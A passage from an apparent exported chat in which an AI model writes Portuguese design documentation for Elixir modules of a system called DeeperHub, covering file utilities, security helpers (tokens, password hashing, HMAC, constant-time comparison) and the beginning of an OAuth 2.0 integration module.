*   **Descrição:** Garante que um diretório exista, criando-o (e seus pais) se necessário. Usa `File.mkdir_p/1`.

### 6.11. `DeeperHub.Shared.Utils.FileUtils.list_dir(dir_path :: String.t(), opts :: keyword()) :: {:ok, list(String.t())} | {:error, atom()}` (Nova Sugestão)

*   **Descrição:** Lista o conteúdo (arquivos e subdiretórios) de um diretório.
*   **`opts`:** `:include_hidden` (boolean).
*   Usa `File.ls/1`.

### 6.12. `DeeperHub.Shared.Utils.FileUtils.delete_file(path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugestão)

*   **Descrição:** Exclui um arquivo. Usa `File.rm/1`.

### 6.13. `DeeperHub.Shared.Utils.FileUtils.delete_dir_recursive(dir_path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugestão)

*   **Descrição:** Exclui um diretório e todo o seu conteúdo recursivamente. Usa `File.rm_rf/1`. **Usar com extremo cuidado.**

## ⚙️ 7. Configuração

Este módulo geralmente não tem muitas configurações próprias, mas pode ser influenciado por:
*   `[:shared, :utils, :file, :default_text_encoding]` (String): Encoding padrão para arquivos de texto. (Padrão: `\"utf-8\"`)
*   `[:shared, :utils, :file, :mime_type_mappings]` (Map): Mapa customizado de `%{\".ext\" => \"mime/type\"}` para `get_mime_type/1`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Security.PathTraversalProtection`: Crucial para ser usado pelos chamadores deste módulo se os caminhos vierem de fontes não confiáveis.
*   `DeeperHub.Core.ConfigManager` (para configurações opcionais).

### 8.2. Bibliotecas Externas

*   Nenhuma, primariamente usa os módulos `File`, `Path`, `:crypto` do Elixir/Erlang.
*   Opcionalmente, uma biblioteca para detecção de MIME type mais robusta (baseada em magic bytes) se `get_mime_type/1` precisar ser mais avançado.

## 🤝 9. Como Usar / Integração

Os chamadores devem primeiro garantir que os caminhos são seguros (usando `PathTraversalProtection`) antes de passar para `FileUtils`.

```elixir
alias DeeperHub.Shared.Utils.FileUtils
alias DeeperHub.Security.PathTraversalProtection

@secure_base_dir Application.compile_env!(:my_app, :secure_file_storage_path)

def process_uploaded_document(user_filename, binary_data) do
  # 1. Pegar apenas o nome do arquivo, não o caminho completo do cliente
  safe_name = Path.basename(user_filename) 
  
  # 2. Construir o caminho completo dentro do diretório base seguro
  target_path_candidate = Path.join(@secure_base_dir, safe_name)

  # 3. Normalizar e verificar se ainda está dentro do diretório base
  case PathTraversalProtection.normalize_path(target_path_candidate) do
    {:ok, normalized_path} ->
      case PathTraversalProtection.verify_path_in_base(normalized_path, @secure_base_dir) do
        {:ok, :allowed} ->
          FileUtils.write_binary_file(normalized_path, binary_data)
        _ ->
          {:error, :unsafe_path_after_normalization}
      end
    {:error, _} ->
      {:error, :invalid_path_construction}
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função com caminhos válidos e inválidos.
*   Testar operações em arquivos/diretórios existentes e não existentes.
*   Testar tratamento de erros de permissão (pode exigir configuração do sistema de arquivos no ambiente de teste).
*   Testar opções como `:append`, `:force`, `:ensure_dir`.
*   Testar `calculate_file_hash` com arquivos conhecidos.
*   Testar `get_mime_type` para extensões comuns.
*   Localização: `test/deeper_hub/shared/utils/file_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Geralmente não são emitidos diretamente por este módulo utilitário. Os chamadores seriam responsáveis por registrar métricas (ex: número de arquivos escritos, tempo de hash) ou logs de erro se uma operação de arquivo falhar.
*   Exceção: `record_attempt` em `PathTraversalProtection` seria chamado pelo código que usa `FileUtils` se uma verificação de segurança falhar *antes* de chamar `FileUtils`.

## ❌ 11. Tratamento de Erros

*   As funções retornam `{:ok, ...}` ou `{:error, reason_atom}`. Os `reason_atom` geralmente correspondem aos átomos de erro do módulo `File` (ex: `:enoent` - arquivo não encontrado, `:eacces` - permissão negada, `:eisdir` - é um diretório, etc.).
*   É responsabilidade do chamador tratar esses erros.

## 🛡️ 12. Considerações de Segurança

*   **NUNCA use entrada de usuário diretamente para construir caminhos de arquivo sem sanitização e validação rigorosa com `PathTraversalProtection`.** Este módulo `FileUtils` assume que os caminhos fornecidos já foram verificados ou são estaticamente definidos e seguros.
*   **Permissões de Arquivo:** Esteja ciente das permissões com as quais os arquivos/diretórios são criados.
*   **Condições de Corrida (Race Conditions):** Em operações como verificar se um arquivo existe e depois escrevê-lo, pode haver condições de corrida se não forem tratadas adequadamente (TOCTOU - Time-of-check to time-of-use). Use `File.write/3` com flags apropriadas ou mecanismos de bloqueio se a atomicidade for crítica (embora isso seja mais complexo).
*   **Exposição de Informações em Erros:** Erros de arquivo podem vazar informações sobre a estrutura do sistema de arquivos. Trate os erros de forma a não expor esses detalhes para o usuário final.

## 🧑‍💻 13. Contribuição

*   Mantenha as funções focadas em operações de arquivo genéricas.
*   Sempre pense nas implicações de segurança de qualquer nova função que lide com caminhos.
*   Documente claramente o comportamento de erro.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar funções para lidar com arquivos temporários de forma segura.
*   [ ] Utilitários para compressão/descompressão de arquivos (zip, gzip).
*   [ ] Funções de streaming mais avançadas para processamento de arquivos grandes.
*   [ ] Para `get_mime_type`, integrar com uma biblioteca que use \"magic bytes\" para uma detecção mais robusta do que apenas a extensão.

---

*Última atualização: 2025-05-12*

---

Este cobre `FileUtils`. O próximo utilitário natural seria `DeeperHub.Shared.Utils.SecurityUtils` para fechar o ciclo dos utilitários mais comuns. Depois disso, poderíamos ir para `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos finalizar a seção de utilitários detalhando `DeeperHub.Shared.Utils.SecurityUtils`. Este módulo é para helpers de segurança de baixo nível que são genéricos e não se encaixam em um módulo de segurança mais específico.

---

# Módulo: `DeeperHub.Shared.Utils.SecurityUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.SecurityUtils`

O módulo `DeeperHub.Shared.Utils.SecurityUtils` fornece um conjunto de **funções utilitárias de segurança de baixo nível e agnósticas de contexto**. Estas são ferramentas básicas que podem ser usadas por vários módulos de segurança ou outras partes do sistema para tarefas como geração de tokens aleatórios seguros, hashing de senhas (se não totalmente encapsulado em `Auth`), e outras operações criptográficas simples.

O objetivo é fornecer blocos de construção seguros e bem testados para funcionalidades de segurança mais complexas, evitando a reinvenção de primitivas criptográficas e promovendo o uso de práticas seguras. 😊

**Importante:** Este módulo é para utilitários *genéricos*. Operações de segurança mais complexas ou específicas de um domínio (como gerenciamento de chaves de criptografia, fluxos de autenticação completos, políticas de segurança) devem residir em seus respectivos módulos Core ou de Segurança (ex: `Core.EncryptionService`, `Auth`, `SecurityPolicyManager`).

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Geração de Dados Aleatórios Seguros:**
    *   Gerar sequências de bytes aleatórios criptograficamente seguros.
    *   Fornecer funções para gerar tokens aleatórios em diferentes formatos (hex, base64) e comprimentos (`generate_token/2`).
    *   Gerar IDs únicos e seguros (ex: UUIDs ou baseados em bytes aleatórios) (`generate_id/1`).
    *   Gerar códigos de recuperação ou OTPs numéricos/alfanuméricos simples (`generate_recovery_code/2`).
*   **Hashing de Senhas (Básico):**
    *   Fornecer uma função para gerar um hash seguro de uma senha usando um algoritmo forte e salt (`hash_password/2`).
    *   Fornecer uma função para verificar uma senha contra um hash armazenado (`verify_password/2`).
    *(Nota: A lógica principal de hashing de senha, incluindo políticas e gerenciamento de algoritmos, provavelmente residiria em `DeeperHub.Auth.Services.PasswordService` ou `Core.EncryptionService`. As funções aqui seriam implementações diretas de um algoritmo específico se necessário como utilitário.)*
*   **Operações HMAC (Hash-based Message Authentication Code):**
    *   Gerar um HMAC para verificar a integridade e autenticidade de dados usando uma chave secreta (`generate_hmac/3`).
    *   Verificar um HMAC (`verify_hmac/4`).
*   **Comparação Segura de Tempo Constante:**
    *   Fornecer uma função para comparar duas strings (ex: tokens, hashes) de forma que o tempo de execução não dependa do número de caracteres correspondentes, prevenindo ataques de timing.
*   **Geração de Chaves de Assinatura Simples:**
    *   Gerar chaves aleatórias adequadas para assinar tokens JWT ou outros dados (`generate_signing_key/0`). (Gerenciamento mais complexo de chaves estaria em `Core.EncryptionService`).
*   **Avaliação de Risco Simplificada (se presente aqui, conforme doc original):**
    *   Uma função muito básica para agregar scores de risco ponderados (`evaluate_risk/1`). (Lógica mais complexa estaria em `RiskAssessment`).
*   **Verificação de Bloqueio de IP (Stub/Placeholder):**
    *   A função `is_ip_blocked/2` mencionada na documentação original seria um stub aqui, delegando para o `IPFirewallService` real. Utilitários de segurança não devem gerenciar estado de bloqueio.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.SecurityUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade de segurança.
    *   Utiliza o módulo `:crypto` do Erlang/Elixir para operações criptográficas.
    *   Pode usar bibliotecas como `Comeonin` ou `Argon2_elixir` para hashing de senhas, se essa funcionalidade for implementada aqui em vez de delegada.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/security_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Foco em Primitivas:** Este módulo deve focar em fornecer primitivas de segurança e blocos de construção, não em implementar fluxos de segurança complexos.
*   **Uso de `:crypto`:** Para geração de aleatoriedade e hashing, o módulo `:crypto` do Erlang é a escolha preferida por ser parte da OTP e bem testado.
*   **Hashing de Senhas:** Se incluído aqui, deve usar um algoritmo moderno e forte (Argon2id, bcrypt). É crucial usar salts únicos para cada senha.
*   **Clareza sobre Segurança:** A documentação de cada função deve ser clara sobre suas garantias de segurança e limitações.

## 🛠️ 4. Casos de Uso Principais

*   **Geração de Token de Reset de Senha:**
    *   `DeeperHub.Recovery.PasswordResetService` chama `SecurityUtils.generate_token(32, :base64url)` para criar um token opaco e seguro.
*   **Criação de um Novo Usuário com Senha:**
    *   `DeeperHub.Auth.Services.UserService` (ou `PasswordService`) chama `SecurityUtils.hash_password(user_password)` para obter o hash a ser armazenado. (Mais provável que a função de hash esteja encapsulada no serviço de senha).
*   **Assinatura de Payload de Webhook (Simples):**
    *   `DeeperHub.Webhooks.PayloadSigner` usa `SecurityUtils.generate_hmac(payload, webhook_secret, algorithm: :sha256)` para criar a assinatura.
*   **Geração de ID Único para um Recurso:**
    *   Um serviço precisa de um ID não sequencial: `SecurityUtils.generate_id(:uuid)`.

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado. O fluxo é a chamada de uma função e o retorno do seu resultado.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original e refinando)*

### 6.1. `DeeperHub.Shared.Utils.SecurityUtils.generate_token(length_bytes :: pos_integer() \\\\ 32, format :: :hex | :base64 | :base64url | :binary \\\\ :base64url) :: String.t() | binary()`

*   **Descrição:** Gera uma string ou binário aleatório criptograficamente seguro com `length_bytes` de entropia.
*   **Retorno:** String no formato especificado ou binário.

### 6.2. `DeeperHub.Shared.Utils.SecurityUtils.generate_id(format :: :uuid | :hex_16_bytes | :base64url_16_bytes \\\\ :uuid) :: String.t()`

*   **Descrição:** Gera um identificador único.
    *   `:uuid`: UUID v4.
    *   `:hex_16_bytes`: 16 bytes aleatórios codificados em hex (32 caracteres).
    *   `:base64url_16_bytes`: 16 bytes aleatórios codificados em base64url.
*   **Exemplo:** `generate_id()` -> `\"f47ac10b-58cc-4372-a567-0e02b2c3d479\"`

### 6.3. `DeeperHub.Shared.Utils.SecurityUtils.generate_recovery_code(length :: pos_integer() \\\\ 6, format :: :numeric | :alphanumeric_upper | :alphanumeric_mixed \\\\ :numeric) :: String.t()`

*   **Descrição:** Gera um código simples para recuperação ou OTP. *Não usar para senhas.*
*   **`format`:**
    *   `:numeric`: Apenas dígitos.
    *   `:alphanumeric_upper`: Dígitos e letras maiúsculas.
    *   `:alphanumeric_mixed`: Dígitos e letras maiúsculas/minúsculas.

### 6.4. `DeeperHub.Shared.Utils.SecurityUtils.hash_password(password :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Gera um hash seguro de senha usando um algoritmo forte (ex: Argon2id ou bcrypt via uma biblioteca).
*   **`opts`:** Pode incluir `:salt` (raramente usado externamente), ou opções de custo do algoritmo.
*   **Retorno:** Hash da senha como string (incluindo salt e parâmetros) ou erro.
*   **Nota:** Recomenda-se que esta lógica seja encapsulada em `DeeperHub.Auth.Services.PasswordService`.

### 6.5. `DeeperHub.Shared.Utils.SecurityUtils.verify_password(password :: String.t(), stored_hash :: String.t()) :: boolean()`

*   **Descrição:** Verifica se a `password` corresponde ao `stored_hash`.
*   **Retorno:** `true` se corresponder, `false` caso contrário.
*   **Nota:** Recomenda-se que esta lógica seja encapsulada em `DeeperHub.Auth.Services.PasswordService`.

### 6.6. `DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(data :: String.t() | binary(), key :: binary(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Gera um HMAC (Hash-based Message Authentication Code).
*   **`opts`:**
    *   `:algorithm` (atom): Ex: `:sha256`, `:sha512`. (Padrão: `:sha256`)
    *   `:output_format` (atom): Ex: `:hex`, `:base64`. (Padrão: `:hex`)

### 6.7. `DeeperHub.Shared.Utils.SecurityUtils.verify_hmac(data :: String.t() | binary(), hmac_to_verify :: String.t(), key :: binary(), opts :: keyword()) :: boolean()`

*   **Descrição:** Verifica um HMAC. Retorna `true` se válido, `false` caso contrário.
*   **`opts`:** Mesmas de `generate_hmac/3` para garantir que a comparação use os mesmos parâmetros.

### 6.8. `DeeperHub.Shared.Utils.SecurityUtils.secure_compare(string1 :: String.t(), string2 :: String.t()) :: boolean()` (Nova Sugestão)

*   **Descrição:** Compara duas strings em tempo constante para prevenir ataques de timing. Essencial para comparar tokens de API, senhas secretas, etc.
*   Usa `Plug.Crypto.secure_compare/2`.

### 6.9. `DeeperHub.Shared.Utils.SecurityUtils.generate_signing_key(length_bytes :: pos_integer() \\\\ 32) :: binary()`

*   **Descrição:** Gera uma chave aleatória de `length_bytes` adequada para uso como segredo de assinatura HMAC ou JWT (HS256/HS512).

## ⚙️ 7. Configuração

Este módulo geralmente não tem muitas configurações próprias, mas pode ser influenciado por configurações de segurança globais se, por exemplo, o algoritmo de hashing de senha padrão fosse definido globalmente.

*   `[:security, :hashing, :password_algorithm]` (Atom): Se o algoritmo de hash de senha fosse configurável (ex: `:argon2id`, `:bcrypt`).
*   `[:security, :hmac, :default_algorithm]` (Atom): Algoritmo HMAC padrão.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Nenhuma, idealmente. Poderia usar `Core.ConfigManager` para padrões se necessário.

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP): Para geração de bytes aleatórios e funções de hash/HMAC.
*   `Plug.Crypto` (para `secure_compare/2`).
*   Opcionalmente, bibliotecas de hashing de senha como `Argon2_elixir` ou `Comeonin` (com `bcrypt_elixir` ou `pbkdf2_elixir`).

## 🤝 9. Como Usar / Integração

*   **Geração de Tokens:** Módulos como `DeeperHub.Recovery` ou `DeeperHub.Tokens` usariam `generate_token/2` para criar tokens opacos.
*   **Verificação de Assinaturas:** Módulos que lidam com webhooks ou dados assinados usariam `verify_hmac/4`.
*   **Comparação de Tokens:** Qualquer lugar que precise comparar um token fornecido pelo usuário com um token armazenado deve usar `secure_compare/2`.

```elixir
alias DeeperHub.Shared.Utils.SecurityUtils

def create_password_reset_token(user_id) do
  token_value = SecurityUtils.generate_token(32, :base64url)
  # ... armazenar o token (ou seu hash) associado ao user_id ...
  token_value
end

def is_api_key_valid?(provided_key, stored_hashed_key_part) do
  # Esta é uma simplificação; a validação real de chaves de API é mais complexa
  # e geralmente envolve buscar o hash completo da chave.
  # Aqui, apenas para ilustrar secure_compare.
  SecurityUtils.secure_compare(provided_key, some_derived_value_from_stored_hash)
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a geração de tokens/IDs para garantir o formato e comprimento corretos, e aleatoriedade (difícil de testar diretamente, mas verificar a não repetição em um grande número de chamadas).
*   Testar `hash_password` e `verify_password` com senhas válidas e inválidas.
*   Testar `generate_hmac` e `verify_hmac` com dados e chaves conhecidos.
*   Testar `secure_compare` para garantir que retorna `true` para strings iguais e `false` para diferentes, e que seu tempo de execução é relativamente constante (mais difícil de testar unitariamente, mas é uma propriedade conhecida da implementação subjacente).
*   Localização: `test/deeper_hub/shared/utils/security_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Geralmente não aplicável para um módulo de utilitários puros, a menos que uma operação específica (ex: hashing de senha) seja identificada como um gargalo e precise de instrumentação.

## ❌ 11. Tratamento de Erros

*   Funções devem levantar `ArgumentError` para entradas de tipo inválido.
*   Funções que podem falhar devido a razões criptográficas (ex: falha no algoritmo subjacente, embora raro com `:crypto`) podem retornar `{:error, reason}` ou levantar exceções.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Fonte de Aleatoriedade:** Sempre usar `:crypto.strong_rand_bytes/1` para gerar material aleatório para tokens, chaves, salts, etc. Não usar geradores de números pseudoaleatórios não seguros (ex: `:rand`).
*   **Hashing de Senhas:** Se implementado aqui, seguir as melhores práticas: algoritmo forte (Argon2id é o recomendado atualmente), salt único por senha, número de iterações/custo adequadamente alto.
*   **Segredos e Chaves:** Este módulo *gera* chaves ou tokens, mas não é responsável por seu armazenamento seguro. O chamador é responsável por isso.

## 🧑‍💻 13. Contribuição

*   Novas funções de utilidade de segurança devem ser revisadas cuidadosamente quanto à sua correção criptográfica e potenciais vulnerabilidades.
*   Prefira usar as primitivas do `:crypto` sempre que possível.
*   Mantenha a documentação clara sobre o propósito e as garantias de segurança de cada função.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar utilitários para criptografia/descriptografia simétrica simples com uma chave fornecida (se `Core.EncryptionService` for considerado muito pesado para alguns casos de uso internos e menos críticos). *Cuidado aqui, pois pode levar à proliferação de gerenciamento de chaves ad-hoc.*
*   [ ] Fornecer wrappers para operações comuns do `:public_key` se criptografia assimétrica for necessária em algum utilitário.
*   [ ] Avaliar a necessidade de funções de \"key derivation\" (KDF) genéricas, além do que é usado implicitamente no hashing de senhas.

---

*Última atualização: 2025-05-12*

---

Com `SecurityUtils`, completamos a visão geral dos principais módulos em `DeeperHub.Shared.Utils`.

Agora temos uma base sólida de módulos Core, de Segurança e Utilitários. Onde gostaria de ir a seguir? Podemos começar a detalhar um dos módulos de domínio mais complexos como `DeeperHub.OAuth` ou `DeeperHub.MFA`, ou talvez o `DeeperHub.Webhooks`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos então para um dos módulos de domínio/autenticação mais complexos e interativos: `DeeperHub.OAuth`. Este módulo lida com a integração com provedores de autenticação externos como Google, Facebook, GitHub, etc.

---

# Módulo: `DeeperHub.OAuth` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.OAuth`

O módulo `DeeperHub.OAuth` é responsável por gerenciar a **autenticação e autorização de usuários através de provedores OAuth 2.0 externos** (como Google, Facebook, GitHub, Apple, etc.). Ele permite que os usuários do DeeperHub façam login ou registrem-se usando suas contas existentes nesses provedores, além de permitir que o DeeperHub (com consentimento do usuário) acesse certos dados ou execute ações em nome do usuário nesses serviços externos.

As principais funcionalidades incluem:
1.  Iniciar o fluxo de autorização OAuth com o provedor.
2.  Processar o callback do provedor após a autorização do usuário.
3.  Trocar o código de autorização por tokens de acesso e refresh.
4.  Buscar informações do perfil do usuário do provedor.
5.  Vincular contas OAuth a contas DeeperHub existentes ou criar novas contas.
6.  Gerenciar (armazenar, atualizar, revogar) os tokens OAuth obtidos.

Este módulo simplifica a integração com múltiplos provedores OAuth, oferecendo uma interface unificada para o restante da aplicação. 😊

*(Nota: A documentação original tem `DeeperHub.OAuth.Adapters.OAuthAdapterUnified`, `Behaviours.OAuthBehaviourUnified`, `Cache.UserInfoCache`, `Integrations.EventIntegration`, `Integrations.OAuthApiIntegration`, `OAuthCompatibility`, `OAuthFacadeUnified`, `Schema.OAuthToken`, e vários `Services`. Esta documentação tentará consolidar e organizar essas responsabilidades.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Início do Fluxo OAuth (`authorize_url/3`):**
    *   Gerar a URL de autorização correta para um provedor específico, incluindo `client_id`, `redirect_uri`, `scope`, `state`, e outros parâmetros necessários.
*   **Processamento de Callback (`process_oauth_callback/4` ou `authenticate_with_code/3`):**
    *   Receber e validar o código de autorização e o parâmetro `state` do provedor.
    *   Trocar o código de autorização por um token de acesso e, opcionalmente, um token de refresh (`exchange_code/3`).
*   **Obtenção de Informações do Usuário (`get_user_info/2`):**
    *   Usar o token de acesso para buscar informações do perfil do usuário do endpoint de userinfo do provedor.
*   **Gerenciamento de Contas DeeperHub:**
    *   Encontrar um usuário DeeperHub existente com base no email ou ID do provedor.
    *   Criar uma nova conta DeeperHub se o usuário não existir e o auto-registro via OAuth estiver habilitado.
    *   Vincular a identidade OAuth a uma conta DeeperHub existente (`link_account/4`).
    *   Desvincular uma conta OAuth (`unlink_account/2`).
*   **Gerenciamento de Tokens OAuth (`DeeperHub.OAuth.Schema.OAuthToken`):**
    *   Armazenar de forma segura os tokens de acesso e refresh obtidos dos provedores.
    *   Atualizar tokens de acesso usando tokens de refresh.
    *   Lidar com a revogação de tokens.
*   **Abstração de Provedores:**
    *   Suportar múltiplos provedores OAuth com configurações e fluxos específicos para cada um.
    *   Utilizar adaptadores por provedor ou uma biblioteca OAuth genérica (como `Assent`).
*   **Cache de Informações do Usuário (`Cache.UserInfoCache`):**
    *   Cachear informações do perfil do usuário obtidas dos provedores para reduzir chamadas de API.
*   **Segurança:**
    *   Uso do parâmetro `state` para prevenir ataques CSRF durante o fluxo OAuth.
    *   Validação rigorosa de `redirect_uri`.
    *   Armazenamento seguro de `client_secret` e tokens.
*   **Integração com `DeeperHub.Auth` e `DeeperHub.Accounts`:**
    *   Após a autenticação OAuth bem-sucedida, criar uma sessão DeeperHub e emitir tokens DeeperHub.
*   **Observabilidade e Auditoria:**
    *   Logar etapas do fluxo OAuth e quaisquer erros.
    *   Registrar métricas sobre autenticações OAuth.
    *   Auditar vinculação e desvinculação de contas.
*   **Proteção com Circuit Breaker (`Integrations.OAuthApiIntegration`):**
    *   Proteger chamadas para os endpoints dos provedores OAuth (token, userinfo) usando circuit breakers.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.OAuth` (Fachada Pública, ex-`OAuthFacadeUnified`):**
    *   Ponto de entrada para todas as operações OAuth.
    *   Delega para o `OAuthService`.
2.  **`DeeperHub.OAuth.Services.OAuthService` (ou `DefaultOAuthService`):**
    *   **Responsabilidade:** Orquestra o fluxo OAuth completo.
    *   **Interações:**
        *   `ProviderService` (ou adaptadores de provedor): Para obter URLs de autorização e trocar códigos por tokens.
        *   `CallbackService`: Para processar o callback, buscar informações do usuário e lidar com a conta DeeperHub.
        *   `DeeperHub.OAuth.Schema.OAuthToken` (via `Core.Repo`): Para armazenar e gerenciar tokens OAuth.
        *   `DeeperHub.Accounts`: Para encontrar/criar usuários DeeperHub.
        *   `DeeperHub.Auth.SessionManager` e `TokenService`: Para criar sessões DeeperHub após autenticação.
        *   `Cache.UserInfoCache`: Para cachear perfis de usuário OAuth.
        *   `Integrations.OAuthApiIntegration`: Para fazer chamadas HTTP seguras aos provedores.
3.  **`DeeperHub.OAuth.Services.ProviderService` (ou Adaptadores por Provedor):**
    *   **Responsabilidade:** Encapsular a lógica específica de cada provedor OAuth (endpoints, escopos padrão, formato de dados do usuário).
    *   Pode usar uma biblioteca como `Assent` internamente ou implementar chamadas HTTP diretas (protegidas por `OAuthApiIntegration`).
4.  **`DeeperHub.OAuth.Services.CallbackService`:**
    *   **Responsabilidade:** Lógica específica para o manuseio do callback do provedor, incluindo validação de `state`, troca de código, e conciliação com contas DeeperHub.
5.  **`DeeperHub.OAuth.Integrations.OAuthApiIntegration`:**
    *   Utiliza `DeeperHub.Core.CircuitBreaker` e `Core.HTTPClient` para fazer chamadas seguras aos endpoints dos provedores.
6.  **`DeeperHub.OAuth.Cache.UserInfoCache` (GenServer/ETS):**
    *   Armazena temporariamente os perfis de usuário obtidos dos provedores.
7.  **`DeeperHub.OAuth.Schema.OAuthToken` (Ecto Schema):**
    *   Armazena `user_id` (DeeperHub), `provider` (ex: \"google\"), `provider_user_id`, `access_token` (criptografado), `refresh_token` (criptografado), `expires_at`, `scopes`.
8.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   `client_id`, `client_secret`, `redirect_uri`, escopos padrão, URLs de endpoint para cada provedor OAuth configurado.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/oauth/
├── oauth.ex                          # Fachada Pública (ex-OAuthFacadeUnified)
│
├── services/
│   ├── oauth_service.ex              # Serviço orquestrador principal
│   ├── provider_service.ex           # Lógica/adaptadores para interagir com provedores
│   └── callback_service.ex           # Lógica para processar callbacks
│
├── integrations/
│   ├── event_integration.ex
│   ├── audit_integration.ex          # (Se necessário, logar vinculações/desvinculações)
│   └── oauth_api_integration.ex      # Chamadas HTTP com Circuit Breaker
│
├── cache/
│   └── user_info_cache.ex
│
├── schemas/                          # (Ou schema/)
│   └── oauth_token.ex
│
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Abstração de Provedor:** O `ProviderService` ou o uso de uma biblioteca como `Assent` é crucial para adicionar novos provedores facilmente.
*   **Segurança do `state`:** O parâmetro `state` deve ser gerado, armazenado temporariamente (ex: na sessão do usuário ou em um cache de curta duração com ID na sessão) e validado no callback para prevenir CSRF.
*   **Armazenamento Seguro de Tokens:** `client_secret`s e `refresh_token`s/`access_token`s de usuário devem ser armazenados de forma criptografada em repouso (`Core.EncryptionService`).
*   **Fluxo de Vinculação de Conta:** Definir claramente como uma identidade OAuth é vinculada a uma conta DeeperHub nova ou existente (ex: por correspondência de email verificado, ou permitindo que o usuário escolha).
*   **Gerenciamento de Escopos:** Lidar corretamente com os escopos solicitados e concedidos.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Novo Registra-se com Google:**
    1.  Usuário clica em \"Registrar com Google\".
    2.  Frontend chama `GET /api/oauth/google/authorize_url`.
    3.  `OAuth.authorize_url(:google, ...)` gera a URL do Google.
    4.  Usuário é redirecionado para o Google, autoriza.
    5.  Google redireciona para `/api/oauth/google/callback?code=...&state=...`.
    6.  `OAuth.authenticate_with_code(:google, code, state, context)` é chamado.
    7.  Tokens são trocados, perfil do Google é buscado.
    8.  Como o usuário é novo, uma conta DeeperHub é criada, vinculada à identidade Google.
    9.  Uma sessão DeeperHub é criada, tokens DeeperHub são retornados.
*   **Usuário Existente Faz Login com Facebook:**
    *   Fluxo similar, mas no final, a identidade Facebook é vinculada a uma conta DeeperHub existente (ex: pelo email).
*   **Usuário Existente Vincula uma Nova Conta GitHub ao seu Perfil DeeperHub:**
    *   Usuário já logado no DeeperHub vai para \"Contas Vinculadas\".
    *   Clica em \"Vincular GitHub\".
    *   Fluxo OAuth similar, mas no final, a identidade GitHub é apenas adicionada ao `user_id` DeeperHub existente.

## 🌊 5. Fluxos Importantes

### Fluxo Completo de Autenticação OAuth 2.0 (Authorization Code Grant)

1.  **Início (Cliente DeeperHub -> Fachada OAuth):**
    *   O cliente (ex: frontend DeeperHub) solicita a URL de autorização para um provedor (ex: Google).
    *   `DeeperHub.OAuth.authorize_url(:google, configured_redirect_uri, generate_and_store_state_param())`.
    *   O `state` é gerado, armazenado na sessão do usuário ou cache com TTL curto, e incluído na URL.
    *   A URL do Google é retornada ao cliente.
2.  **Redirecionamento para o Provedor:**
    *   O navegador do usuário é redirecionado para a URL do Google.
3.  **Autorização pelo Usuário (no site do Provedor):**
    *   O usuário faz login no Google (se necessário) e concede as permissões solicitadas pelo DeeperHub.
4.  **Redirecionamento de Volta para DeeperHub (Callback):**
    *   Google redireciona o navegador do usuário para a `redirect_uri` configurada no DeeperHub, incluindo um `code` (código de autorização) e o `state` original.
    *   Ex: `https://app.deeperhub.com/oauth/google/callback?code=AUTH_CODE_FROM_GOOGLE&state=STORED_STATE`.
5.  **Processamento do Callback (Controller API -> Fachada OAuth):**
    *   O controller do DeeperHub recebe o `code` e `state`.
    *   Chama `DeeperHub.OAuth.authenticate_with_code(:google, code, state, %{ip_address: ..., user_agent: ...})`.
6.  **`DeeperHub.OAuth.Services.OAuthService` e `CallbackService`:**
    *   **Validação do `state`:** Compara o `state` recebido com o armazenado na Etapa 1. Se diferente, aborta (CSRF).
    *   **Troca de Código por Tokens:** Chama `ProviderService` (ou `OAuthApiIntegration`) para enviar o `code` para o endpoint de token do Google (com `client_id`, `client_secret`, `redirect_uri`).
        *   `OAuthApiIntegration` faz a chamada HTTP POST protegida por Circuit Breaker.
    *   **Recebimento de Tokens:** Recebe `access_token`, `refresh_token` (se aplicável), `expires_in` do Google.
    *   **Busca de Informações do Usuário:** Chama `ProviderService` (ou `OAuthApiIntegration`) para usar o `access_token` e buscar o perfil do usuário do endpoint userinfo do Google.
        *   Perfil é cacheado no `UserInfoCache`.
    *   **Conciliação de Conta:**
        *   Tenta encontrar um usuário DeeperHub existente pelo `provider_user_id` (ex: Google ID) ou pelo email verificado do perfil Google.
        *   Se encontrado, vincula a identidade OAuth (se ainda não vinculada) ou atualiza os tokens OAuth.
